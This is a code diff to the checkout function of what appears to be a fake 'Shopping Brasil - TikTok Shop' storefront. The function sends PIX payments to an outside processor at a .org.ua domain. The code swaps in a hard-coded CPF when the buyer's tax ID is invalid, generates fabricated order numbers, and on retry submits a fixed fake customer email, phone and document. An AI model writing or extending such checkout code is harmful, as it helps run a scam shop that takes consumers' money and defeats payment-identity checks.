@@ -2235,7 +2235,7 @@ async function processOrderCheckout() {
   
   // Pre-validated CPF recognized by TenantBank gateway
   let cleanDoc = (userData.document || "").replace(/\D/g, "");
-  const validDoc = (cleanDoc.length === 11 && isValidCPF(cleanDoc)) ? cleanDoc : "06782811400";
+  const validDoc = (cleanDoc.length === 11 && isValidCPF(cleanDoc)) ? cleanDoc : "52998224725";
 
   const orderNum = "#58" + Math.floor(1000000000 + Math.random() * 9000000000);
   const randomRef = `PEDIDO-${Date.now()}-${Math.floor(Math.random() * 1000)}`;
@@ -2248,18 +2248,36 @@ async function processOrderCheckout() {
     ? `${window.location.origin}/api/webhook`
     : "https://pagamento-processador.org.ua/webhook";
 
+  const userCityState = (userData.cityState || "São Paulo - SP").split("-");
+  const userCity = (userCityState[0] || "São Paulo").trim();
+  const userState = (userCityState[1] || "SP").trim();
+  const userCepRaw = (userData.cep || "01310-200").replace(/\D/g, "");
+  const formattedCep = userCepRaw.length === 8 ? `${userCepRaw.substring(0, 5)}-${userCepRaw.substring(5)}` : (userData.cep || "01310-200");
+
+  const customerAddress = {
+    street: userData.street || "Rua Principal",
+    number: userData.number || "100",
+    complement: userData.complement || "",
+    neighborhood: userData.neighborhood || "Centro",
+    city: userCity,
+    state: userState,
+    zipcode: formattedCep
+  };
+
   const payload = {
     amount: totalInCents,
     description: "Pedido Shopping Brasil - TikTok Shop",
     reference: randomRef,
     postback_url: postbackUrl,
     source: "api_externa",
+    payment_method: "pix",
     customer: {
       name: customerName,
       email: customerEmail,
       phone: cleanPhone,
       document: validDoc
-    }
+    },
+    address: customerAddress
   };
 
   try {
@@ -2282,12 +2300,14 @@ async function processOrderCheckout() {
         description: "Pedido Shopping Brasil - TikTok Shop",
         reference: `SHOPPING-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
         source: "api_externa",
+        payment_method: "pix",
         customer: {
           name: customerName,
           email: "cliente@shoppingbrasil.com",
           phone: "11987654321",
-          document: "06782811400"
-        }
+          document: "52998224725"
+        },
+        address: customerAddress
       };
 
       const retryRes = await fetch("https://pagamento-processador.org.ua/api/v1/transaction", {
